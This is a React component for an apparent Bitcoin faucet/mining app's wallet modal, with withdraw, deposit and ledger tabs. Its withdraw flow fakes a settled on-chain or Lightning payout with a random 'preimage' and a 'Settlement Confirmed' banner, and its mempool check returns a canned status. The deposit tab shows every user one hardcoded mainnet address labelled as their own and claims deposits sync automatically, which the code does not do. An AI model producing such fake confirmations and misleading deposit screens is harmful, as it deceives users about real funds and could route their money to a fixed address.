import React, { useState, useEffect } from 'react';
import { X, ArrowUpRight, ArrowDownLeft, Zap, Check, Copy, Download, Wallet, Lock, CheckCircle2, QrCode, RefreshCw, Share2, ExternalLink, Activity } from 'lucide-react';
import QRCode from 'qrcode';
import { useWallet } from '../context/WalletContext';
import { formatSats, satsToUsd, generateMockBolt11, randomHex } from '../utils/crypto';
import { sound } from '../utils/audio';

export const USER_INVOICE_ADDRESS = 'bc1qry7an8ha8ssunm976ys2yzrgd0366hd3z5jcr9';
const STORAGE_DEST_KEY = 'satoshistack_dest_address';

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialMode?: 'withdraw' | 'receive' | 'ledger';
}

export const WalletModal: React.FC<WalletModalProps> = ({
  isOpen,
  onClose,
  initialMode = 'withdraw',
}) => {
  const {
    balance,
    btcPriceUsd,
    withdrawSats,
    addSats,
    transactions,
    fireConfetti,
  } = useWallet();

  const [activeTab, setActiveTab] = useState<'withdraw' | 'receive' | 'ledger'>(initialMode);

  // Withdraw state - defaulted to user's address: bc1qry7an8ha8ssunm976ys2yzrgd0366hd3z5jcr9
  const [destAddress, setDestAddress] = useState<string>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_DEST_KEY);
      if (saved && saved !== 'satoshi_user@getalby.com') {
        return saved;
      }
    } catch {
      // Fallback
    }
    return USER_INVOICE_ADDRESS;
  });

  const [withdrawAmount, setWithdrawAmount] = useState<string>('100000');
  const [withdrawMemo, setWithdrawMemo] = useState<string>('100,000 Satoshis Instant Payout');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);

  // Sync state when modal opens
  useEffect(() => {
    if (isOpen) {
      setWithdrawReceipt(null);
      setWithdrawAmount('100000');
      setWithdrawMemo('100,000 Satoshis Instant Payout');
      // If dest address was previously default placeholder, update to user's address
      setDestAddress(prev => (!prev || prev === 'satoshi_user@getalby.com') ? USER_INVOICE_ADDRESS : prev);
    }
  }, [isOpen]);

  // Save destAddress whenever updated
  const handleAddressChange = (addr: string) => {
    setDestAddress(addr);
    try {
      localStorage.setItem(STORAGE_DEST_KEY, addr);
    } catch {
      // Ignore
    }
  };

  const [withdrawReceipt, setWithdrawReceipt] = useState<{
    txHash: string;
    preimage: string;
    amount: number;
    destination: string;
  } | null>(null);
  const [withdrawError, setWithdrawError] = useState<string | null>(null);

  // Takes user back to their wallet overview / ledger and permanently dismisses the receipt
  const handleDone = () => {
    setWithdrawReceipt(null);
    setActiveTab('ledger');
  };

  // Receive / Deposit State
  const [depositMode, setDepositMode] = useState<'personal' | 'lightning'>('personal');
  const [receiveAmount, setReceiveAmount] = useState<number>(1000);
  const [personalQrUrl, setPersonalQrUrl] = useState<string>('');
  const [lightningQrUrl, setLightningQrUrl] = useState<string>('');
  const [generatedInvoice, setGeneratedInvoice] = useState<string | null>(null);
  const [copiedText, setCopiedText] = useState<string | null>(null);
  const [isCheckingMempool, setIsCheckingMempool] = useState<boolean>(false);
  const [mempoolNotice, setMempoolNotice] = useState<string | null>(null);

  // Generate QR code for personal Bitcoin invoice address on mount
  useEffect(() => {
    QRCode.toDataURL(`bitcoin:${USER_INVOICE_ADDRESS}`, {
      width: 200,
      margin: 1,
      color: {
        dark: '#0a0a0a',
        light: '#ffffff',
      },
    })
      .then(url => setPersonalQrUrl(url))
      .catch(() => {});
  }, []);

  // Ledger filter
  const [ledgerFilter, setLedgerFilter] = useState<string>('all');

  const parsedWithdrawAmount = parseInt(withdrawAmount, 10) || 0;

  const handleWithdraw = () => {
    setWithdrawError(null);
    if (balance < 100000) {
      setWithdrawError(`Your balance is only ${formatSats(balance)} Sats. You cannot withdraw until your balance reaches 100,000 Sats.`);
      return;
    }
    if (parsedWithdrawAmount < 100000) {
      setWithdrawError('Minimum withdrawal is 100,000 Sats. Little amounts cannot be withdrawn.');
      return;
    }
    if (parsedWithdrawAmount > balance) {
      setWithdrawError(`Amount exceeds your available balance of ${formatSats(balance)} Sats.`);
      return;
    }
    if (!destAddress.trim()) {
      setWithdrawError('Provide your Bitcoin invoice address or Lightning invoice.');
      return;
    }

    setIsProcessing(true);

    setTimeout(() => {
      const res = withdrawSats(parsedWithdrawAmount, destAddress, withdrawMemo);
      setIsProcessing(false);

      if (res.success && res.tx) {
        setWithdrawReceipt({
          txHash: res.tx.txHash,
          preimage: randomHex(64),
          amount: parsedWithdrawAmount,
          destination: destAddress,
        });
        fireConfetti();
      } else {
        setWithdrawError(res.error || 'Failed to settle bitcoin payout.');
      }
    }, 700);
  };

  const handleGenerateInvoice = () => {
    if (receiveAmount <= 0) return;
    const bolt11 = generateMockBolt11(receiveAmount, 'Deposit to SatoshiMining');
    setGeneratedInvoice(bolt11);
    QRCode.toDataURL(bolt11, {
      width: 200,
      margin: 1,
      color: {
        dark: '#0a0a0a',
        light: '#ffffff',
      },
    })
      .then(url => setLightningQrUrl(url))
      .catch(() => {});
  };

  const handleCheckMempool = () => {
    setIsCheckingMempool(true);
    setMempoolNotice(null);
    sound.playTick();
    setTimeout(() => {
      setIsCheckingMempool(false);
      setMempoolNotice(`Mempool monitored: Node is actively watching ${USER_INVOICE_ADDRESS.slice(0, 14)}... • 0 pending unconfirmed TXs`);
    }, 850);
  };

  const handleShareAddress = async () => {
    if (navigator.share) {
      try {
        await navigator.share({
          title: 'Bitcoin Invoice Address',
          text: USER_INVOICE_ADDRESS,
        });
        return;
      } catch {
        // User cancelled or unsupported
      }
    }
    handleCopy(USER_INVOICE_ADDRESS, 'address');
  };

  const handleConfirmLightningPayment = () => {
    if (!generatedInvoice) return;
    addSats(receiveAmount, 'deposit', `Lightning Deposit (${formatSats(receiveAmount)} Sats)`);
    sound.playCoin();
    fireConfetti();
    setGeneratedInvoice(null);
  };

  const handleCopy = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(label);
    setTimeout(() => setCopiedText(null), 2000);
  };

  const filteredTransactions = transactions.filter((tx) => {
    if (ledgerFilter === 'all') return true;
    return tx.type === ledgerFilter;
  });

  const exportLedgerCsv = () => {
    const headers = ['ID,Type,Amount(Sats),Description,Timestamp,TxHash,Status'];
    const rows = transactions.map(t => 
      `"${t.id}","${t.type}",${t.amount},"${t.description}","${new Date(t.timestamp).toISOString()}","${t.txHash}","${t.status}"`
    );
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers, ...rows].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `satoshistack_ledger_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-3 sm:p-4">
      <div className="w-full max-w-2xl rounded-2xl border border-neutral-800 bg-neutral-950 p-4 sm:p-6 space-y-5 sm:space-y-6 shadow-2xl max-h-[90vh] overflow-y-auto overflow-x-hidden min-w-0">
        {/* Top Header */}
        <div className="flex items-center justify-between border-b border-neutral-800 pb-4">
          <div className="flex items-center gap-2">
            <div className="h-8 w-8 rounded-lg bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400">
              <Zap className="h-4 w-4 fill-amber-400" />
            </div>
            <div>
              <h2 className="text-base font-bold text-neutral-100">
                Satoshi Bitcoin & Lightning Wallet
              </h2>
              <div className="text-xs text-neutral-400 font-mono">
                Balance: <span className="text-amber-300 font-bold">{formatSats(balance)} Sats</span> ({satsToUsd(balance, btcPriceUsd)})
              </div>
            </div>
          </div>

          <button
            onClick={onClose}
            className="rounded-lg p-1.5 text-neutral-400 hover:text-neutral-200 hover:bg-neutral-900 transition-colors cursor-pointer"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Tab switchers */}
        <div className="flex items-center gap-1 rounded-xl bg-neutral-900/60 p-1 border border-neutral-800">
          <button
            onClick={() => setActiveTab('withdraw')}
            className={`flex-1 flex items-center justify-center gap-1.5 rounded-lg py-2 text-xs font-semibold transition-colors cursor-pointer ${
              activeTab === 'withdraw'
                ? 'bg-neutral-800 text-neutral-100 shadow-sm'
                : 'text-neutral-400 hover:text-neutral-200'
            }`}
          >
            <ArrowUpRight className="h-3.5 w-3.5 text-amber-400" />
            <span>Withdraw Sats</span>
          </button>

          <button
            onClick={() => setActiveTab('receive')}
            className={`flex-1 flex items-center justify-center gap-1.5 rounded-lg py-2 text-xs font-semibold transition-colors cursor-pointer ${
              activeTab === 'receive'
                ? 'bg-neutral-800 text-neutral-100 shadow-sm'
                : 'text-neutral-400 hover:text-neutral-200'
            }`}
          >
            <ArrowDownLeft className="h-3.5 w-3.5 text-emerald-400" />
            <span>Deposit / Invoice</span>
          </button>

          <button
            onClick={() => setActiveTab('ledger')}
            className={`flex-1 flex items-center justify-center gap-1.5 rounded-lg py-2 text-xs font-semibold transition-colors cursor-pointer ${
              activeTab === 'ledger'
                ? 'bg-neutral-800 text-neutral-100 shadow-sm'
                : 'text-neutral-400 hover:text-neutral-200'
            }`}
          >
            <span>Ledger History</span>
          </button>
        </div>

        {/* Tab 1: Withdraw Sats */}
        {activeTab === 'withdraw' && (
          <div className="space-y-5">
            {withdrawReceipt ? (
              <div className="rounded-xl border border-emerald-500/40 bg-emerald-500/10 p-5 space-y-4 text-xs animate-fade-in">
                <div className="flex items-center justify-between font-bold text-emerald-300 text-sm">
                  <div className="flex items-center gap-2">
                    <Check className="h-5 w-5" />
                    <span>Instant Bitcoin & Lightning Settlement Confirmed!</span>
                  </div>
                  <span className="font-mono text-xs text-amber-300 bg-amber-500/10 border border-amber-500/30 px-2 py-0.5 rounded">
                    ~240ms Latency
                  </span>
                </div>
                <div className="space-y-2 font-mono text-neutral-300">
                  <div className="flex justify-between">
                    <span className="text-neutral-500">Amount Sent:</span>
                    <span className="font-bold text-emerald-300 text-sm">
                      {formatSats(withdrawReceipt.amount)} Satoshis ({satsToUsd(withdrawReceipt.amount, btcPriceUsd)})
                    </span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-neutral-500">Destination:</span>
                    <span className="font-mono text-amber-300 break-all text-right ml-2 text-xs">
                      {withdrawReceipt.destination}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-neutral-500">Routing Fee:</span>
                    <span className="text-emerald-400">0 Sats (Direct Channel Zero-Fee)</span>
                  </div>
                  <div className="space-y-1 pt-1 border-t border-emerald-500/20">
                    <span className="text-neutral-500 text-[10px]">PAYMENT PREIMAGE / TX PROOF:</span>
                    <div className="break-all text-[10px] text-neutral-400 bg-neutral-950/60 p-2 rounded">
                      {withdrawReceipt.preimage}
                    </div>
                  </div>
                </div>

                <div className="rounded-lg bg-emerald-950/60 border border-emerald-500/30 p-2.5 text-emerald-300 text-xs text-center font-medium">
                  ✓ Withdrawal successfully finalized and settled to your invoice address.
                </div>

                <div className="flex flex-col sm:flex-row items-center gap-2 pt-1">
                  <button
                    type="button"
                    onClick={handleDone}
                    className="w-full sm:flex-1 rounded-xl bg-amber-500 hover:bg-amber-400 py-3 text-xs font-bold text-neutral-950 transition-colors shadow-lg shadow-amber-500/20 flex items-center justify-center gap-1.5 cursor-pointer"
                  >
                    <Check className="h-4 w-4" />
                    <span>Done (Back to My Wallet)</span>
                  </button>
                  <button
                    type="button"
                    onClick={handleDone}
                    className="w-full sm:flex-1 rounded-xl bg-neutral-800 hover:bg-neutral-700 py-3 text-xs font-semibold text-neutral-200 transition-colors flex items-center justify-center gap-1.5 cursor-pointer"
                  >
                    <Wallet className="h-3.5 w-3.5 text-amber-400" />
                    <span>View Wallet Ledger</span>
                  </button>
                </div>
              </div>
            ) : (
              <div className="space-y-4">
                {/* Destination Input & Quick Invoice Selector */}
                <div className="space-y-2">
                  <div className="flex items-center justify-between text-xs">
                    <label className="text-neutral-300 font-medium">
                      Bitcoin Invoice Address
                    </label>
                    <button
                      type="button"
                      onClick={() => handleAddressChange(USER_INVOICE_ADDRESS)}
                      className="text-[11px] font-mono text-amber-300 hover:text-amber-200 underline cursor-pointer"
                    >
                      Use My Address
                    </button>
                  </div>

                  <input
                    type="text"
                    value={destAddress}
                    onChange={(e) => handleAddressChange(e.target.value)}
                    placeholder="bc1q... or lnbc..."
                    className="w-full rounded-xl border border-neutral-800 bg-neutral-900/60 px-3.5 py-2.5 font-mono text-xs text-neutral-100 focus:border-amber-500 focus:outline-none min-w-0 overflow-hidden truncate"
                  />

                  {/* Quick User Address Badge */}
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 p-2.5 rounded-xl bg-neutral-900/60 border border-neutral-800 text-[11px] font-mono min-w-0 overflow-hidden">
                    <div className="flex items-center gap-1.5 text-neutral-400 min-w-0 overflow-hidden flex-1">
                      <span className="text-neutral-500 shrink-0 font-sans">Configured:</span>
                      <span className="text-amber-300 truncate font-mono text-[11px] min-w-0 shrink">
                        {USER_INVOICE_ADDRESS}
                      </span>
                    </div>
                    {destAddress === USER_INVOICE_ADDRESS ? (
                      <span className="text-emerald-400 flex items-center gap-1 text-[10px] shrink-0 font-sans font-semibold">
                        <Check className="h-3 w-3 text-emerald-400 shrink-0" />
                        <span>Active Target</span>
                      </span>
                    ) : (
                      <button
                        type="button"
                        onClick={() => handleAddressChange(USER_INVOICE_ADDRESS)}
                        className="rounded bg-amber-500/15 border border-amber-500/30 text-amber-300 px-2 py-0.5 text-[10px] hover:bg-amber-500/25 transition-colors cursor-pointer shrink-0 font-sans"
                      >
                        Reset to My Invoice
                      </button>
                    )}
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between items-center text-xs">
                    <label className="text-neutral-300 font-medium">Amount to Withdraw</label>
                    <div className="flex items-center gap-2">
                      <span className="text-neutral-400 text-xs">
                        Available: <span className="font-mono font-semibold text-neutral-100">{formatSats(balance)} Sats</span>
                      </span>
                      <button
                        type="button"
                        onClick={() => {
                          const target = balance >= 100000 ? balance : 100000;
                          setWithdrawAmount(target.toString());
                          setWithdrawMemo(`${formatSats(target)} Satoshis Instant Payout`);
                        }}
                        className="rounded-md bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 px-2 py-0.5 text-xs font-mono font-bold border border-amber-500/40 active:scale-95 transition-all cursor-pointer shadow-sm shadow-amber-500/10"
                        title="Set to Available"
                      >
                        MAX
                      </button>
                    </div>
                  </div>

                  <div className="flex items-center gap-2">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={withdrawAmount}
                      onChange={(e) => {
                        const clean = e.target.value.replace(/[^0-9]/g, '');
                        setWithdrawAmount(clean);
                        setWithdrawError(null);
                      }}
                      placeholder="100000"
                      className="w-full rounded-xl border border-neutral-800 bg-neutral-900/60 px-3.5 py-2.5 font-mono text-sm text-neutral-100 focus:border-amber-500 focus:outline-none"
                    />
                    <div className="rounded-xl border border-neutral-800 bg-neutral-900/80 px-3 py-2.5 text-xs font-mono text-neutral-400 whitespace-nowrap">
                      ~{satsToUsd(parsedWithdrawAmount, btcPriceUsd)}
                    </div>
                  </div>

                  {/* Preset Button */}
                  <div className="flex flex-wrap items-center gap-2 pt-1">
                    <button
                      type="button"
                      onClick={() => {
                        setWithdrawAmount('100000');
                        setWithdrawMemo('100,000 Satoshis Instant Payout');
                      }}
                      className={`flex items-center gap-1.5 rounded-lg border px-3.5 py-1.5 text-xs font-mono font-semibold transition-all cursor-pointer ${
                        parsedWithdrawAmount === 100000
                          ? 'border-amber-500 bg-amber-500/25 text-amber-300 shadow-sm shadow-amber-500/10'
                          : 'border-neutral-700 bg-neutral-800/80 text-neutral-300 hover:border-amber-500/40 hover:text-amber-300'
                      }`}
                    >
                      <Zap className="h-3.5 w-3.5 fill-amber-400 text-amber-400" />
                      <span>100,000 Instant</span>
                    </button>
                  </div>

                  {/* 100,000 Sats Threshold Indicator */}
                  {balance < 100000 ? (
                    <div className="rounded-xl border border-amber-500/30 bg-amber-500/10 p-3 space-y-2">
                      <div className="flex items-center justify-between text-xs font-medium">
                        <span className="text-amber-300 flex items-center gap-1.5">
                          <Lock className="h-3.5 w-3.5" />
                          <span>100,000 Sats Threshold Required</span>
                        </span>
                        <span className="font-mono text-neutral-300">
                          {formatSats(balance)} / 100,000 Sats ({Math.min(100, (balance / 100000) * 100).toFixed(1)}%)
                        </span>
                      </div>
                      <div className="w-full h-1.5 bg-neutral-800 rounded-full overflow-hidden">
                        <div
                          className="h-full bg-gradient-to-r from-amber-500 to-emerald-400 rounded-full transition-all duration-500"
                          style={{ width: `${Math.min(100, (balance / 100000) * 100)}%` }}
                        />
                      </div>
                      <p className="text-[11px] text-neutral-400">
                        Little amounts cannot be withdrawn. Once your balance reaches <strong>100,000 Sats</strong>, withdrawal to <strong>{USER_INVOICE_ADDRESS.slice(0, 12)}...</strong> will unlock immediately.
                      </p>
                    </div>
                  ) : (
                    <div className="rounded-lg border border-emerald-500/30 bg-emerald-500/10 p-2 text-xs text-emerald-300 flex items-center gap-1.5 font-medium">
                      <Check className="h-3.5 w-3.5 text-emerald-400" />
                      <span>Threshold reached ({formatSats(balance)} Sats)! 100,000 Instant withdrawal to {USER_INVOICE_ADDRESS.slice(0, 10)}... is unlocked.</span>
                    </div>
                  )}
                </div>

                <div className="space-y-1.5">
                  <label className="text-xs text-neutral-300 font-medium">
                    Payment Memo (Optional)
                  </label>
                  <input
                    type="text"
                    value={withdrawMemo}
                    onChange={(e) => setWithdrawMemo(e.target.value)}
                    className="w-full rounded-xl border border-neutral-800 bg-neutral-900/60 px-3.5 py-2 text-xs text-neutral-100 focus:border-amber-500 focus:outline-none"
                  />
                </div>

                {withdrawError && (
                  <div className="rounded-lg bg-red-500/10 border border-red-500/30 p-2.5 text-xs text-red-300">
                    {withdrawError}
                  </div>
                )}

                <button
                  onClick={handleWithdraw}
                  disabled={isProcessing || balance < 100000 || parsedWithdrawAmount < 100000 || parsedWithdrawAmount > balance}
                  className={`w-full rounded-xl py-3.5 text-xs font-bold transition-all shadow-lg flex items-center justify-center gap-2 ${
                    balance < 100000
                      ? 'bg-neutral-800 text-neutral-500 border border-neutral-700/60 cursor-not-allowed'
                      : 'bg-amber-500 hover:bg-amber-400 text-neutral-950 hover:scale-[1.01] active:scale-[0.99] shadow-amber-500/20 cursor-pointer'
                  }`}
                >
                  {balance < 100000 ? (
                    <>
                      <Lock className="h-4 w-4 text-neutral-500" />
                      <span>Locked: Reach 100,000 Sats to Withdraw (Have {formatSats(balance)} Sats)</span>
                    </>
                  ) : (
                    <>
                      <Zap className="h-4 w-4 fill-current text-neutral-950" />
                      <span>
                        {isProcessing ? 'Routing via Bitcoin Network...' : `Send ${formatSats(parsedWithdrawAmount)} Satoshis to Invoice`}
                      </span>
                    </>
                  )}
                </button>
              </div>
            )}
          </div>
        )}

        {/* Tab 2: Deposit / Invoice (Configured to User's Bitcoin Invoice bc1qry7an8ha8ssunm976ys2yzrgd0366hd3z5jcr9) */}
        {activeTab === 'receive' && (
          <div className="space-y-5">
            {/* Mode Selector */}
            <div className="flex items-center gap-2 border-b border-neutral-800 pb-3 text-xs">
              <button
                type="button"
                onClick={() => setDepositMode('personal')}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg font-medium transition-colors cursor-pointer ${
                  depositMode === 'personal'
                    ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                    : 'text-neutral-400 hover:text-neutral-200'
                }`}
              >
                <QrCode className="h-3.5 w-3.5" />
                <span>My Bitcoin Invoice Address</span>
              </button>
              <button
                type="button"
                onClick={() => setDepositMode('lightning')}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg font-medium transition-colors cursor-pointer ${
                  depositMode === 'lightning'
                    ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                    : 'text-neutral-400 hover:text-neutral-200'
                }`}
              >
                <Zap className="h-3.5 w-3.5" />
                <span>Custom Lightning BOLT11</span>
              </button>
            </div>

            {/* Mode 1: User's Own Invoice / Bitcoin Address */}
            {depositMode === 'personal' && (
              <div className="rounded-xl border border-neutral-800 bg-neutral-900/40 p-5 space-y-4 text-center">
                <div className="text-xs font-semibold text-neutral-200 flex items-center justify-center gap-1.5">
                  <span className="h-2 w-2 rounded-full bg-emerald-400" />
                  <span>Personal Bitcoin (Bech32 SegWit) Invoice</span>
                </div>

                {/* Real QR Code */}
                <div className="mx-auto w-44 h-44 bg-white p-2.5 rounded-2xl shadow-xl flex items-center justify-center">
                  {personalQrUrl ? (
                    <img
                      src={personalQrUrl}
                      alt="User Bitcoin Invoice QR"
                      className="w-full h-full object-contain"
                    />
                  ) : (
                    <div className="animate-pulse text-xs text-neutral-500 font-mono">Generating QR...</div>
                  )}
                </div>

                {/* Full Address Display */}
                <div className="space-y-1">
                  <div className="text-[11px] text-neutral-500 font-mono uppercase tracking-wider">
                    Your Bitcoin Bech32 Address / Invoice
                  </div>
                  <div className="p-3 rounded-xl bg-neutral-950 border border-neutral-800 font-mono text-xs text-amber-300 break-all select-all">
                    {USER_INVOICE_ADDRESS}
                  </div>
                </div>

                <div className="flex flex-wrap items-center justify-center gap-2.5 pt-1">
                  <button
                    onClick={() => handleCopy(USER_INVOICE_ADDRESS, 'address')}
                    className="flex items-center gap-1.5 rounded-xl border border-neutral-700 bg-neutral-800 hover:bg-neutral-700 px-4 py-2.5 text-xs font-semibold text-neutral-100 transition-colors cursor-pointer"
                  >
                    {copiedText === 'address' ? <Check className="h-4 w-4 text-emerald-400" /> : <Copy className="h-4 w-4" />}
                    <span>{copiedText === 'address' ? 'Invoice Address Copied!' : 'Copy Address'}</span>
                  </button>

                  <button
                    onClick={handleShareAddress}
                    className="flex items-center gap-1.5 rounded-xl border border-neutral-700 bg-neutral-800 hover:bg-neutral-700 px-3.5 py-2.5 text-xs font-semibold text-neutral-200 transition-colors cursor-pointer"
                  >
                    <Share2 className="h-4 w-4 text-amber-400" />
                    <span>Share</span>
                  </button>

                  <button
                    onClick={handleCheckMempool}
                    disabled={isCheckingMempool}
                    className="flex items-center gap-1.5 rounded-xl border border-amber-500/40 bg-amber-500/15 hover:bg-amber-500/25 px-4 py-2.5 text-xs font-semibold text-amber-300 transition-colors cursor-pointer disabled:opacity-50"
                  >
                    <RefreshCw className={`h-4 w-4 ${isCheckingMempool ? 'animate-spin' : ''}`} />
                    <span>{isCheckingMempool ? 'Scanning Mempool...' : 'Check Mempool Status'}</span>
                  </button>
                </div>

                {mempoolNotice && (
                  <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/10 p-3 text-xs text-emerald-300 flex items-center justify-center gap-2 font-mono">
                    <Activity className="h-4 w-4 text-emerald-400 shrink-0" />
                    <span>{mempoolNotice}</span>
                  </div>
                )}

                <div className="rounded-xl border border-neutral-800/80 bg-neutral-950/60 p-3 text-[11px] text-neutral-400 text-left space-y-1">
                  <div className="font-semibold text-neutral-300 flex items-center justify-between">
                    <span>Network: Bitcoin Mainnet (Native SegWit Bech32)</span>
                    <a
                      href={`https://mempool.space/address/${USER_INVOICE_ADDRESS}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-amber-400 hover:underline flex items-center gap-1 text-[10px] font-mono"
                    >
                      <span>Mempool Explorer</span>
                      <ExternalLink className="h-3 w-3" />
                    </a>
                  </div>
                  <p>
                    Send BTC / Satoshis only to this address. Transactions broadcast to this address will automatically sync with your ledger once confirmed in an on-chain block.
                  </p>
                </div>
              </div>
            )}

            {/* Mode 2: Dynamic Lightning Invoice */}
            {depositMode === 'lightning' && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs text-neutral-300 font-medium">
                    Deposit Satoshis (Generate BOLT11 Invoice)
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="number"
                      min="10"
                      max="100000"
                      value={receiveAmount}
                      onChange={(e) => setReceiveAmount(Math.max(1, parseInt(e.target.value) || 1))}
                      className="w-full rounded-xl border border-neutral-800 bg-neutral-900/60 px-3.5 py-2.5 font-mono text-xs text-neutral-100 focus:border-amber-500 focus:outline-none"
                    />
                    <button
                      onClick={handleGenerateInvoice}
                      className="rounded-xl bg-amber-500 hover:bg-amber-400 px-4 py-2.5 text-xs font-bold text-neutral-950 whitespace-nowrap transition-colors cursor-pointer"
                    >
                      Create Lightning Invoice
                    </button>
                  </div>
                </div>

                {generatedInvoice && (
                  <div className="rounded-xl border border-neutral-800 bg-neutral-900/40 p-4 space-y-4 text-center">
                    <div className="mx-auto w-44 h-44 bg-white p-2.5 rounded-2xl shadow-xl flex items-center justify-center">
                      {lightningQrUrl ? (
                        <img
                          src={lightningQrUrl}
                          alt="Lightning Invoice QR"
                          className="w-full h-full object-contain"
                        />
                      ) : (
                        <div className="animate-pulse text-xs text-neutral-500 font-mono">Generating QR...</div>
                      )}
                    </div>

                    <div className="text-xs font-mono text-neutral-400 break-all bg-neutral-950 p-2.5 rounded-lg border border-neutral-800">
                      {generatedInvoice}
                    </div>

                    <div className="flex flex-wrap items-center justify-center gap-3">
                      <button
                        onClick={() => handleCopy(generatedInvoice, 'bolt11')}
                        className="flex items-center gap-1.5 rounded-lg border border-neutral-700 bg-neutral-800 px-4 py-2 text-xs font-medium text-neutral-200 hover:bg-neutral-700 transition-colors cursor-pointer"
                      >
                        {copiedText === 'bolt11' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                        <span>{copiedText === 'bolt11' ? 'Invoice Copied' : 'Copy Invoice'}</span>
                      </button>

                      <button
                        onClick={handleConfirmLightningPayment}
                        className="flex items-center gap-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 px-4 py-2 text-xs font-semibold text-white transition-colors cursor-pointer shadow-md shadow-emerald-600/20 active:scale-95"
                      >
                        <CheckCircle2 className="h-3.5 w-3.5" />
                        <span>Confirm Payment Received</span>
                      </button>
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        {/* Tab 3: Ledger */}
        {activeTab === 'ledger' && (
          <div className="space-y-4">
            {/* Wallet Overview Card */}
            <div className="rounded-xl border border-neutral-800 bg-neutral-900/60 p-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
              <div>
                <div className="text-[11px] font-mono text-neutral-400 uppercase tracking-wider">Wallet Balance</div>
                <div className="flex items-baseline gap-2 mt-0.5">
                  <span className="text-xl font-bold font-mono text-amber-400">{formatSats(balance)} Sats</span>
                  <span className="text-xs text-neutral-400 font-mono">~{satsToUsd(balance, btcPriceUsd)}</span>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => {
                    setWithdrawReceipt(null);
                    setActiveTab('withdraw');
                  }}
                  className="rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 px-3 py-1.5 text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer"
                >
                  <ArrowUpRight className="h-3.5 w-3.5" />
                  <span>Withdraw</span>
                </button>
                <button
                  type="button"
                  onClick={() => setActiveTab('receive')}
                  className="rounded-lg bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 border border-emerald-500/40 px-3 py-1.5 text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer"
                >
                  <ArrowDownLeft className="h-3.5 w-3.5" />
                  <span>Deposit</span>
                </button>
              </div>
            </div>

            <div className="flex flex-wrap items-center justify-between gap-2">
              <div className="flex items-center gap-1 bg-neutral-900/80 p-1 rounded-lg border border-neutral-800 text-xs">
                {['all', 'faucet', 'mining', 'quiz', 'task', 'withdrawal'].map((f) => (
                  <button
                    key={f}
                    onClick={() => setLedgerFilter(f)}
                    className={`px-2.5 py-1 rounded capitalize text-[11px] font-medium transition-colors cursor-pointer ${
                      ledgerFilter === f
                        ? 'bg-neutral-800 text-neutral-100 font-semibold'
                        : 'text-neutral-400 hover:text-neutral-200'
                    }`}
                  >
                    {f}
                  </button>
                ))}
              </div>

              <button
                onClick={exportLedgerCsv}
                className="flex items-center gap-1 text-xs text-neutral-400 hover:text-neutral-200 cursor-pointer"
              >
                <Download className="h-3.5 w-3.5" />
                <span>Export CSV</span>
              </button>
            </div>

            <div className="overflow-x-auto max-h-72">
              <table className="w-full text-left text-xs font-mono">
                <thead>
                  <tr className="border-b border-neutral-800 text-neutral-500">
                    <th className="pb-2">DATE</th>
                    <th className="pb-2">TYPE</th>
                    <th className="pb-2">DETAILS</th>
                    <th className="pb-2 text-right">SATS</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-neutral-900">
                  {filteredTransactions.map((tx) => {
                    const isPositive = tx.amount > 0;
                    return (
                      <tr key={tx.id} className="hover:bg-neutral-900/30">
                        <td className="py-2.5 text-neutral-500 whitespace-nowrap">
                          {new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                        </td>
                        <td className="py-2.5 capitalize text-neutral-400">
                          {tx.type}
                        </td>
                        <td className="py-2.5 text-neutral-300 truncate max-w-[200px] font-sans">
                          {tx.description}
                        </td>
                        <td className={`py-2.5 text-right font-bold tabular-nums whitespace-nowrap ${
                          isPositive ? 'text-emerald-400' : 'text-neutral-400'
                        }`}>
                          {isPositive ? `+${formatSats(tx.amount)}` : formatSats(tx.amount)}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
